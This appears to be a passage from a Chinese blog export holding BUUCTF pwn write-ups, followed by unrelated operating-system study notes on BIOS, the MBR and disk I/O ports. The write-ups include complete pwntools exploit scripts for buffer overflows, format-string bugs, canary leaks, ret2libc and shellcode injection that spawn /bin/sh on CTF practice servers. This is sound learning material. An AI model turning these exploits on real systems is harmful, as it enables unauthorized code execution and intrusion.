(p32(sys)+p32(0)+p32(buf+0xc)+b’&#x2F;bin&#x2F;sh\\x00’).ljust(0x28,b’a’)+p32(buf-4)+p32(leave_ret)&#x3D;&#x3D;\n\np32(buf-4):将ebp覆盖为了buf-4,因为每执行一条指令之后eip会自动+4，这里将eip退回去，防止跳过指令\n\np32(leave_ret)：将返回地址覆盖为leave\n\n此时的栈结构\n\n\n\nbuf\n\n\n\n\nsys_addr\nsystem函数地址\n\n\n0\n返回地址（占位）\n\n\nbuf+12\n&#x2F;bin&#x2F;sh的参数地址\n\n\n&#x2F;bin&#x2F;sh\n\n\n\n填充的剩余空间\n\n\n\nbuf-4\n栈迁移后的ebp\n\n\nleave\n执行leave_ret\n\n\n\n\n\n\n\n55 [ZJCTF 2019]Login栈追踪？或许叭\n函数是用c++写的，看起来有点令人头大\n❯ checksec pwn[*] &#x27;/home/pwn/pwn/buuctf/55/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    Stripped:   No\n\nida查看\n\n\n在第14和16行发现要输入的账号和密码，不过肯定没有这么简单，执行看看\n❯ ./pwn _____   _  ____ _____ _____   _                _|__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __  / /_  | | |     | | | |_    | |   / _ \\ / _` | | &#x27;_ \\ / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |/____\\___/ \\____| |_| |_|     |_____\\___/ \\__, |_|_| |_|                                          |___/Please enter username: adminPlease enter password: 2jctf_pa5sw0rdPassword accepted: Password accepted:[1]    4014 segmentation fault  ./pwn\n\n&#x3D;&#x3D;寄&#x3D;&#x3D;\n看别人的汇编发现在password_checker函数中有一个隐蔽的错误\n\n\n主可以看到在0x400A54位置处有一个call rax指令，那么我们将rax修改为后门函数的地址就可以了（默认你找到那个后门函数了）\n\n\n可以在0x400A89位置处发现rax的值由var_18确定，那么去找一下var_18在哪里\n\n\n有的，兄弟，有的…\n从s处（ebp-0x60)开始，到var_18(ebp-0x18),再除去已经输入的密码2jctf_pa5sw0rd\\x00(0xe长度),我们需要填充的数据量为0x60 - 0x18 - 0xe = 0x3a\n所以exp：\nfrom pwn import *p = remote(&#x27;node5.buuoj.cn&#x27;,25872)backdoor = 0x400e88p.sendlineafter(&#x27;: &#x27;,&#x27;admin&#x27;)p.sendlineafter(&#x27;: &#x27;,b&#x27;2jctf_pa5sw0rd&#x27;+b&#x27;\\x00&#x27;*0x3a+p64(backdoor))p.interactive()\n\n56 picoctf_2018_shellcoderet2shellcode\n题比较简单，尝试了一下盲打\n❯ ./pwnEnter a string!aaaaaaaaaaaaThanks! Executing now...[1]    2462 segmentation fault  ./pwn\n\n根据运行情况，猜测是输入相关字符串并当作函数执行，所以直接写入shellcode试试\nfrom pwn import *p = remote(&#x27;node5.buuoj.cn&#x27;,28483)p.sendline(asm(shellcraft.sh()))p.interactive()\n\n然后打通了\n57 hitcontraining_magicheap施工中\n58 jarviso_level1本身应该挺简单的，但是远程和本地的输出不一样\n本地：\nfrom pwn import *context.log_level = &#x27;debug&#x27;p = process(&#x27;./pwn&#x27;)p.recvuntil(b&#x27;:&#x27;)buf_addr = int(p.recv(10),16)log.info(hex(buf_addr))payload = asm(shellcraft.sh()).ljust(0x87+0x4,b&#x27;b&#x27;)+p32(buf_addr)p.sendline(payload)p.interactive()\n\n接受buf的地址，然后ret回buf处执行shellcode\n但是远程要先输入再回显，所以只能ret2libc\nfrom pwn import *from LibcSearcher import *p=remote(&#x27;node5.buuoj.cn&#x27;,29446)elf=ELF(&quot;./pwn&quot;)main_addr=0x80484b7write_plt=elf.plt[&#x27;write&#x27;]write_got=elf.got[&#x27;write&#x27;]payload=b&#x27;a&#x27;*(0x88+0x4)+p32(write_plt)+p32(main_addr)+p32(0x1)+p32(write_got)+p32(0x4)p.send(payload)write_addr=u32(r.recv(4))libc=LibcSearcher(&#x27;write&#x27;,write_addr)libc_base=write_addr-libc.dump(&#x27;write&#x27;)system_addr=libc_base+libc.dump(&#x27;system&#x27;)bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload =b&#x27;a&#x27;*(0x88+0x4)+p32(system_addr)+p32(main_addr)+ p32(bin_sh)p.send(payload)p.interactive()\n\n59 axb 2019 fmt32fmt+ret2libc\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)#gdb.attach(p)printf_got = elf.got[&#x27;printf&#x27;]printf_plt = elf.plt[&#x27;printf&#x27;]payload = b&#x27;a&#x27;+p32(printf_got)+b&#x27;b&#x27;+b&#x27;%8$s&#x27;p.sendlineafter(b&#x27;me:&#x27;, payload)p.recvuntil(b&#x27;b&#x27;)printf_addr = u32(p.recv(4))log.info(&quot;prinf_addr:&quot;+hex(printf_addr))libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)libc_base = printf_addr - libc.dump(&#x27;printf&#x27;)sys = libc_base+libc.dump(&#x27;system&#x27;)binsh = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload2 = b&#x27;a&#x27;+fmtstr_payload(8,&#123;printf_got:system&#125;,wirte_size = &#x27;byte&#x27;,numbwritten = 0xa)p.sendline(payload2)p.sendline(&#x27;/bin/sh\\x00&#x27;)p.interactive()\n\n分析❯ checksec pwn[*] &#x27;/home/pwn/pwn/buuctf/59/pwn&#x27;    Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x8048000)    Stripped:   No\n\n\n在第25行有明显fmt漏洞,经过输入查询发现我们的输入偏移为8（但不完全是）\n\ngdb测试的时候发现第一个字符的输入是存放在了第7个偏移处，所以应该先填充一个字符，防止后来的地址出现问题\n\n在printf_got后面加一个b&#39;b&#39;为了做为recvuntil()的标记，泄露printf地址后就可以libc了\n60 cinscn_s_9shellcode\nchecksec一下\n❯ checksec pwn[*] &#x27;/home/pwn/pwn/buuctf/60/pwn&#x27;    Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX unknown - GNU_STACK missing    PIE:        No PIE (0x8048000)    Stack:      Executable    RWX:        Has RWX segments    Stripped:   No    Debuginfo:  Yes\n\n有RWX段,保护全关，估计shellcode,ida看看\nint pwn()&#123;  char s[24]; // [esp+8h] [ebp-20h] BYREF  puts(&quot;\\nHey! ^_^&quot;);  puts(&quot;\\nIt&#x27;s nice to meet you&quot;);  puts(&quot;\\nDo you have anything to tell?&quot;);  puts(&quot;&gt;&quot;);  fflush(stdout);  fgets(s, 50, stdin);  puts(&quot;OK bye~&quot;);  fflush(stdout);  return 1;&#125;void hint()&#123;  __asm &#123; jmp     esp &#125;&#125;\n\n有一个jmp esp函数，pwn函数里存在溢出点，但总计可以读入0x32字节，不够写shellcraft.sh()，所以要手写\n这边梳理一下流程\n在栈上写入小shellcode-&gt;覆盖返回地址为jmp esp-&gt;让esp指向shellcode-&gt;主动调用esp\nexp:\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;,log_level = &#x27;debug&#x27;,arch=&#x27;i386&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)shellcode = &#x27;&#x27;&#x27;xor    eax, eaxpush   eaxpush   0x68732f2fpush   0x6e69622fmov    ebx, espmov    ecx, eaxmov    edx, eaxmov    al, 0xbint    0x80&#x27;&#x27;&#x27;&#x27;shellcode = asm(shellcode)payload = shellcode.ljust(0x24,b&#x27;\\x00&#x27;)+p32(0x8048554)payload+=asm(&#x27;sub esp,0x28;call esp&#x27;)\t# 0x24+0x4=0x28p.sendline(payload)p.interactive()\n\n\n\nbuu刷题记录（61-80题）by Maple\n61 others_babystackcanary+libc\nchecksec一下\n❯ checksec pwn[*] &#x27;/home/pwn/pwn/buuctf/61/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Full RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        No PIE (0x400000)\n\nNX保护，Canary保护，所以思路应该是泄露Canary，然后泄露libc，然后ROP\n看下源码\nssize_t sub_4008B9()&#123;  sub_400826(&quot;--------&quot;);  sub_400826(&quot;1.store&quot;);  sub_400826(&quot;2.print&quot;);  sub_400826(&quot;3.quit&quot;);  sub_400826(&quot;--------&quot;);  return sub_4007F7(&quot;&gt;&gt; &quot;);&#125;int sub_400841()&#123;  char s[40]; // [rsp+10h] [rbp-30h] BYREF  unsigned __int64 v2; // [rsp+38h] [rbp-8h]  v2 = __readfsqword(0x28u);  memset(s, 0, 0x20uLL);  if ( (int)read(0, s, 0x20uLL) &lt;= 0 )    exit(1);  return atoi(s);&#125;__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  int v3; // eax  char s[136]; // [rsp+10h] [rbp-90h] BYREF  unsigned __int64 v6; // [rsp+98h] [rbp-8h]  v6 = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  memset(s, 0, 0x80uLL);  while ( 1 )  &#123;    sub_4008B9();    v3 = sub_400841();    switch ( v3 )    &#123;      case 2:        puts(s);                                // 回显Canary        break;      case 3:        return 0LL;      case 1:        read(0, s, 0x100uLL);                   // 可以溢出        break;      default:        sub_400826(&quot;invalid choice&quot;);        break;    &#125;    sub_400826(&amp;unk_400AE7);  &#125;&#125;\n\n是一个菜单，1对应输入，2对应输出（用puts）\n所以canary截断泄露，libc用puts泄露，然后构造ROP\nfrom pwn import *from struct import packcontext(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29212)#--------Canary-------payload = b&#x27;a&#x27;*(0x90-0x8)p.recvuntil(&#x27;&gt;&gt; &#x27;)p.sendline(&#x27;1&#x27;)p.sendline(payload)p.recvuntil(&#x27;&gt;&gt; &#x27;)p.sendline(&#x27;2&#x27;)p.recvuntil(b&#x27;a&#x27;*(0x90-0x8)+b&#x27;\\n&#x27;)canary = u64(b&#x27;\\x00&#x27;+p.recv(7))log.info(&quot;canary:&quot;+hex(canary))#-------leak_libc------puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]main = 0x400908pop_rdi = 0x0000000000400a93p.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)payload1 = b&#x27;a&#x27;*0x88+p64(canary)+b&#x27;b&#x27;*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendline(payload1)p.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;3&#x27;)puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))libc_base = puts_addr-libc.symbols[&#x27;puts&#x27;]log.info(&quot;libc_base&quot;+hex(libc_base))#---------getshell-------p.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)one_gadget = libc_base+0x45216payload2 = b&#x27;b&#x27;*0x88+p64(canary)+b&#x27;b&#x27;*0x8+p64(one_gadget)p.sendline(payload2)p.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;3&#x27;)p.interactive()\n\n这边用的one_gadget,正常的ROP也是没有问题的\n62 pwnable_startshellcode\nchecksec一下\n❯ checksec pwn[*] &#x27;/home/pwn/pwn/buuctf/62/pwn&#x27;    Arch:       i386-32-little    RELRO:      No RELRO    Stack:      No canary found    NX:         NX disabled    PIE:        No PIE (0x8048000)    Stripped:   No\n\n保护全关\nida看一下，汇编写的\npublic _start_start proc nearpush    esppush    offset _exitxor     eax, eaxxor     ebx, ebxxor     ecx, ecxxor     edx, edxpush    3A465443hpush    20656874hpush    20747261hpush    74732073hpush    2774654Chmov     ecx, esp        ; addrmov     dl, 14h         ; lenmov     bl, 1           ; fdmov     al, 4int     80h             ; LINUX - sys_writexor     ebx, ebxmov     dl, 3Ch ; &#x27;&lt;&#x27;mov     al, 3int     80h             ; LINUX -add     esp, 14hretn\n\n扔给ai分析一下，read那里可以读入60字节，但是栈只有20字节，可以溢出\n所以我们可以先给esp指的位置泄露出来，然后把那个地方写入shellcode并执行\nfrom pwn import *context.arch = &#x27;i386&#x27;#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,25719)payload = b&#x27;a&#x27;*20+p32(0x08048087)# ida里可以看到，这里对应的是\tmov\t\tecx,espp.recvuntil(b&#x27;:&#x27;)p.send(payload)leak = u32(p.recv(4))shellcode = b&#x27;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#x27;#shellcode = asm(shellcraft.sh())payload2 = b&#x27;a&#x27;*20+p32(leak+20)+shellcodep.send(payload2)p.interactive()\n\n可以在这里找一些合适的shellcode\n63 gyctf_2020_borrowstack直接看这篇吧\n64 hitcontraining_heapcreator施工中\n65","categories":["wp"]},{"title":"操作系统学习笔记","url":"/2025/06/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"0xFF 前言很早就萌生了自己写一个操作系统的想法，但是碍于学校各种事情，总是没时间，终于迎来了暑假，尝试在这个暑假里写一写,或许会更新成一个系列（？,但愿吧\n这里是打算跟着吾爱上的这一系列博客进行操作，在这里记录一些笔记\n0x01 BIOS以及MBR0x01 00 操作系统的启动从我们按下电源键到最终启动的完成，大致是下图的一个流程，而这一小节主要是编写BIOS以及MBR，其作用是引导操作系统的启动\n    graph TD;\n    A[加电] --> B[POST: 硬件自检];\n    B --> C{BIOS/UEFI?};\n    C -->|BIOS| D[加载MBR的引导代码];\n    C -->|UEFI| E[读取ESP分区的.efi文件];\n    D --> F[GRUB Stage 1 → Stage 1.5 → Stage 2];\n    E --> G[执行EFI应用程序（如grubx64.efi）];\n    F --> H[加载内核（vmlinuz/ntoskrnl.exe）和initramfs];\n    G --> H;\n    H --> I[内核初始化: 驱动、内存管理、挂载根文件系统];\n    I --> J{Linux/Windows?};\n    J -->|Linux| K[Systemd启动（PID=1）];\n    J -->|Windows| L[启动smss.exe → winlogon.exe];\n    K --> M[并行启动服务单元（网络、日志等）];\n    L --> N[加载用户配置和桌面（Explorer.exe）];\n    M --> O[显示登录界面（GDM/LightDM）];\n    N --> P[用户登录桌面];\n    O --> Q[用户登录Shell或图形界面];\n    Q --> R[启动完成];\n    P --> R;\n\n0x01 01 BIOS全称为Base Input &amp; Output System，也就是基本输入输出系统\n但是我们知道，开机的时候并不存在页表，也就没有页映射这一说，所以只能通过物理地址来进行编程，这一利用物理地址的模式我们叫做实模式\n\n  \n    \n      tips\n\n    \n    \n      页表是操作系统维护的一种数据结构，用于存储虚拟页号到物理页号帧号的映射关系，每个进程都有自己的页表，由内存管理单元（MMU)在地址转换时使用\n页映射就是指页表将虚拟地址空间中的页面映射到物理内存中的页帧的过程\n大概是这样一个过程（有点像哈希表）\n虚拟地址 -&gt; [虚拟页号 | 页内偏移]\t\t\t  |\t\t\t  | 通过页表查找\t\t\t  ↓物理地址 -&gt; [物理页帧号 | 页内偏移]\n    \n  \n\n关于实模式，以8086为例，列举一些\n\nBIOS入口在0xFFFF0-0xFFFFF,执行了一个jmp指令，跳转到真正的BIOS地址\n中断向量表在0x00000到0x003FF\nMBR加载地址在0x7C00到0x7DFF\n\n0x01 02 BIOSBIOS的功能是检测初始化硬件，存放在内存ROM区，但现在存储在主板上的一个或多个芯片中\n我们可以在上面的流程图中看到某个叫做POST（Power-On Self-Test的过程，主要是检查CPU、内存、主板、硬盘、显卡等设备。POST结束后系统BIOS调用其它设备的BIOS对各个设备进行检测和初始化。如果没有什么问题，就将执行启动程序\n\n  \n    \n      tips\n\n    \n    \n      ROM和RAM\n\nROM(只读存储器)：断电后数据不会丢失，通常不可写入（现代类型允许有限次擦写），读取速度快但写入速度慢\nRAM（随机存取存储器）：断电后数据丢失，支持高速频繁读写，比ROM和硬盘快的多\n\n一般情况下，CPU从ROM加载固件（例如BIOS），再加载操作系统到RAM\n\n    \n  \n\n0x01 03 MBR 主引导记录BIOS最后的工作就是检验0盘0道1扇区的内容（就是第一个磁盘扇区）。检验时若BIOS检验处该磁盘末尾两个字节是0x55和0xaa,则认为其是活动区，便加载到物理地址0x7c00,然后跳转过去，执行MBR\n\n  \n    \n      tips\n\n    \n    \n      磁盘扇区\n存储设备中的最小物理存储单元，也是操作系统和文件系统读写数据的基本单位，可以理解为书架的每一个格子\n通过磁头（HDD）或控制器（SSD)定位到目标扇区，读取数据到内存\n为什么是0x55 0xaa\n这是MBR的引导签名，用于告诉BIOS该磁盘有效的引导代码。属于是早期签名的遗留\n\n    \n  \n\nMBR为我们第一个在编写操作系统中自行构造出来的程序，但是要遵循下面一些规定：\n\nMBR的大小为512字节\n第511和512字节必须要是0xaa,0x55（由于模拟的是x86平台，所以采用小端序）\n凑行\n\n那么接下来就可以编写mbr.S程序，主要思路如下：\n\n\n清屏。利用BIOS所建立的中断向量表，用0x06号功能（也就是int 0x10),我们实现系统调用的操作只需要我们将功能号送入ah（也就是向ax中传入0x600)寄存器，然后执行int 0x10\n在编写的section后面加上vstart&#x3D;0x7c00表示，告诉编译器将起始地址编译为0x7c00\n通过中断3号功能来获取光标位置\n利用中断向量来实现打印字符串\n填充到511字节\n填充0xaa, 0x55\n\n\n0x02 MBR支持显卡在之前的MBR中，我们用BIOS的中断实现打印字符擦到屏幕，然后用jmp自身这个指令来实现类似while的功能，但打印字符串之后就结束了，接下来完善MBR的功能\n0x02 0x00首先先解释几个重要的标志位\n\n\n\nCF进位标志\n用于反应运算是否产生进位或借位，如果运算结果的最高位产生一个进位或借位，则CF置1.运算结果的最高位包括字操作的第15位和字节操作的第7位\n\n\n\nPF奇偶标志\n用于反映运算结果低8位中“1”的个数\n\n\nAF辅助进位标志\n在字节操作时低半字节向高半字节进位或借位，字操作时低字节向高字节进位或借位，AF置1\n\n\nZF零标志\n用于判断结果是否为0，运算结果为0时置1\n\n\nSF符号标志\n反应运算结果的符号，运算结果为负，SF为1\n\n\nOF溢出标志\n反映有符号数加减运算是否溢出，溢出时置1\n\n\nTF陷阱标志\n当TF被置1时，CPU进入单步模式（每执行一步指令后都产生一个单步中断）\n\n\nIF中断标志\n决定CPU是否响应外部可屏蔽中断请求，IF为1时，允许响应外部的可屏蔽中断请求\n\n\nDF方向表示\n决定串操作指令执行时有关指针寄存器调整方向。DF为1时，串操作指令按递减的方式改变有关存储器指针值，每次操作后使SI、DI递减\n\n\n0x02 0x01 IO接口什么是IO接口\n可以理解为一系列端口与控制逻辑的结合，它所实现的功能就是让计算机与外设可以通信，就是在CPU和外设之间，又加了一层逻辑\n如何使得CPU访问到IO接口\n一种方法是统一编址，在统一编址之下，我们会将主存分开一部分来供IO接口来使用，比如说0x000~0x7ff为咱们正常使用的物理地址，剩下的0x800-0xfff就全部作为IO接口地址来进行访问，只要访问的地址落于后一段，CPU就认为在使用某一个IO接口\n还有一种方法是选择独立编址，访问主存的地址与IO接口的地址无关，COU区分你是访问主存还是IO接口的因素是指令操作码，也就是类似于ADD、SUB等这类的汇编语句，不需要从主存专门划分出一段区域供IO接口使用。下面是关于这一种访问方式的语法\n\n  \n    \n      tips\n\n    \n    \n      \nin指令用来从端口中读取数据，一般形式为\n\nin al,dx\n\nin ax,dx\n这里的al，ax是指从端口读取数据所存放的寄存器，而dx是指IO端口号\n\n\n\nout指令用来向端口输入数据，一般形式为\n\nout dx\\立即数,al\n\nout dx\\立即数,ax\n同in指令\n\n\n\n\n\n    \n  \n\n0x02 02 显示器、显卡、显存上一次我们是通过BIOS所建立的中断向量表实现向显示器输送一段数据。但是BIOS的中断向量表示在实模式之后的保护模式将不存在，所以接下来要试着利用IO进行输出字符到显示器上\n下面是显存分布\n\n\n\n起始\n结束\n大小\n用途\n\n\n\nC0000\nC7FFF\n32KB\n显示适配器BIOS\n\n\nB8000\nBFFFF\n32KB\n用于文本模式显示适配器\n\n\nB0000\nB7FFF\n32KB\n用于黑白显示适配器\n\n\nA0000\nAFFFF\n64KB\n用于彩色显示适配器\n\n\n由上表可知，当地址处于0xB8000-0xBFFFF时，在此的输出的数据会直接落在显存中，接下来显示器就可以直接拿到CPU所输出的数据（又是加了一层抽象）\n0x03 升级MBR接下来我们就需要利用IO功能来时实现打印功能了\n其实原理看着很繁琐，但是代码是很简单的，例如\nmov byte [gs:0x00], &#x27;M&#x27;mov byte [gs:0x01], 0x94mov byte [gs:0x02], &#x27;a&#x27;mov byte [gs:0x03], 0x94mov byte [gs:0x04], &#x27;p&#x27;mov byte [gs:0x05], 0x94mov byte [gs:0x06], &#x27;l&#x27;mov byte [gs:0x07], 0x94mov byte [gs:0x08], &#x27;e&#x27;mov byte [gs:0x09], 0x94\n\n0x03 MBR操作硬盘以及Loader继续升级MBR,这次如题所示，了解磁盘相关内容\n0x03 00 基础知识磁盘\n\n\n\n介绍\n图片\n\n\n\n一个磁盘由多个盘片叠加而成；盘片的表面涂有磁性物质，用来记录二进制数据，因此一个盘片可能有两个盘面\n\n\n\n每个盘片被划分为一个个磁道，每个磁道又被划分为一个个扇区。其中，最内侧磁道上的扇区面积最小，因此数据密度最大\n\n\n\n每个盘面对应一个磁头。所有的磁头都是在一个磁臂上的。所有盘面中相对位置相同的磁道组成柱面\n\n\n\n因此，可以用（柱面号、盘面号、扇区号）来定位任意一个磁盘块。这也可以称为物理磁盘地址\n\n\n\n而根据物理磁盘地址，可以实现读取一个“块”\n根据“柱面号”移动磁臂，让磁头指向指定柱面 -&gt; 激活指定盘面对应的磁头 -&gt; 磁盘旋转的过程中，指定的扇区会从磁头下面划过，完成了对指定扇区的读&#x2F;写\n硬盘控制端口\n硬盘同样是一种外设，需要指定的IO接口和CPU通信，这个IO接口就叫做硬盘控制器\n其IO模式与显卡不同，使用显卡时我们使用的是统一编址，但是硬盘控制器使用独立编址\n主盘、从盘、通道\n电脑中通常安装多个硬盘，因此需要分出主从关系，也就衍生出了硬盘中的Master和Slave，即主盘和从盘（你就是老娘的master吗）。很久以前系统一般安装在主盘上，但随着计算机的发展，这两种盘区别变得不是那么大了\n一般主板上会给出两个叫做通道的插槽，这是一种比DMA更加高级的存在，负责IO的数据直接传到内存，不需要CPU控制\n端口寄存器\n\n实际上端口可以简单的被分为两组，即Command Block registers和Control Block registers。其中前者用于向硬盘驱动器写入命令或者从硬盘控制器获得硬盘状态；后者用于控制硬盘工作状态\n接下来介绍一下各个端口的用途\n\nData寄存器：用来管理数据，是唯一的16位。一般来说，读磁盘时，不断读此寄存器相当于读出硬盘控制器中的缓冲数据；写磁盘时，将数据写入该磁盘相当于向硬盘控制器写入数据\n\nError寄存器:只有在读取硬盘失败的时候，端口为0x171&#x2F;0x1f1的寄存器中才记录失败的信息，尚未读取的扇区数放在Sector count寄存器中\n\nFeature寄存器：只有在写硬盘，并且需要额外指定参数时，将参数写入该寄存器\n\nLBA寄存器：这里需要详细说一下LBA的相关信息\n\n前面分析的时候，我们都是按照”柱面-磁头-扇区“来进行定位，这种方法称为CHS，但是这种方法略显复杂，我们更希望使用逻辑上的地址进行定位，而不需要考虑物理结构，因此诞生了LBA寄存器\n目前的LBA共有两种，LBA28和LBA48，即28bit&#x2F;48bit描述扇区的地址，而因为每个扇区都是512字节，则其支持的最大硬盘容量为128GB&#x2F;128PB。\nLBA low、mid、high分别对应地址0-7位、8-15位和16-32位。仅靠这些寄存器无法唯一标识LBA，因此还需要使用Device寄存器，其低4位白哦是LBA28的24-27位，从而与上面可以共同完成LBA28的表示；第4位标识通道中的主盘或从盘；第5、7位为固定的1，称为MBS位；第6位标识是否启用LBA模式\n\n\nStatus寄存器：其在读硬盘时，用来给出硬盘的状态信息，\n\n第0位是ERR位，如果为1，表示命令出错，可以查看Error位；\n\n第3位是data request位，如果为1，表示硬盘数据已经准备完毕，可以读取数据；\n\n第6位是DRDY，如果为1，表示硬盘检测正常；\n\n第7位是BSY位，如果为1，表示硬盘正忙，其余所有位都无效。写硬盘时，该端口充当command寄存器，存放需要硬盘执行的命令。主要包括三个命令\nidentify: 0xEC\t;硬盘识别read sector：0x20\t；读扇区write sector：0x30\t；写扇区\n\n\n\n硬盘操作方法\n硬盘中可用的指令有很多，主要介绍数据的传送方式，大致顺序如下\n\n选择通道,往通道的sector count寄存器写入我们即将操作的扇区数目\n向0x1F3、0x1F4、0x1F5分别写入LBA地址的低24位\n往device寄存器的低4字节写入LBA地址的高4位，设置第6位为1,表明使用LBA寻址模式，再设置第四位来选择操作的硬盘是主盘还是从盘\n往通道的command寄存器写入操作命令\n读取通道上的status寄存器，判断硬盘工作是否完成\n若上述命令选择了读硬盘，则进入下一个步骤，若为写或者其他，则完工\n将硬盘数据读出\n\n数据传输方式一般为两种;\n\n查询传送方式：也称为程序I&#x2F;O、PIO，指传输之前，先获取硬盘控制器的Status控制器，如果为数据可用，则获取数据即可\n中断传送方式：也称为中断驱动I&#x2F;O，当硬盘设备准备号数据后，通过发送中断通知来通知COU，然后CPU直接获取数据\n\n0x03 01 使用MBR来操作硬盘我们知道MBR的本职工作是加载Loader，然后Loader加载我们的操作系统。Loader也是存放在硬盘上的，所以就需要改进MBR来实现读取硬盘上的程序操作，依此加载Loader\nLoader的位置\n按照上文的介绍，MBR加载在第一个扇区，但是由于是LBA寻址，所以MBR存放在0扇区。因此理论来说1扇区之后的所有地点都可以存放Loader，但是为了保险起见，设置一个空扇区作为缓冲，将之放入2扇区。\n之后的操作就是:MBR将Loader从2扇区读出来，然后将之存入内存\n存入内存哪里呢？请看下面内存布局图，标记为可用的其实都可以使用\n\n\n\n开始地址\n结束地址\n大小\n用途\n\n\n\nFFFF0\nFFFFF\n16B\nBIOS入口，这么小的一个位置实际上仅仅是一个跳转指令\n\n\nF0000\nFFFEF\n64KB-16B\n系统BIOS\n\n\nC8000\nEFFFF\n160KB\n映射硬件适配器的ROM或内存映射式I&#x2F;O\n\n\nC0000\nC7FFF\n32KB\n显示适配器BIOS\n\n\nB8000\nBFFFF\n32KB\n文本显示适配器\n\n\nB0000\nB7FFF\n32KB\n黑白显示适配器\n\n\nA0000\nAFFFF\n64KB\n彩色显示适配器\n\n\n9FC00\n9FFFF\n1KB\nEBDA\n\n\n7E00\n9FBFF\n约608KB\n可用\n\n\n7C00\n7DFF\n512B\nMBR加载地址\n\n\n500\n7BFF\n约30KB\n可用\n\n\n400\n4ff\n256B\nBIOS数据区域\n\n\n000\n3FF\n1KB\n中断向量表\n\n\n功能实现\n跟着博客教程来就好了，这边不加叙述\n","categories":["OS"],"tags":["OS"]}]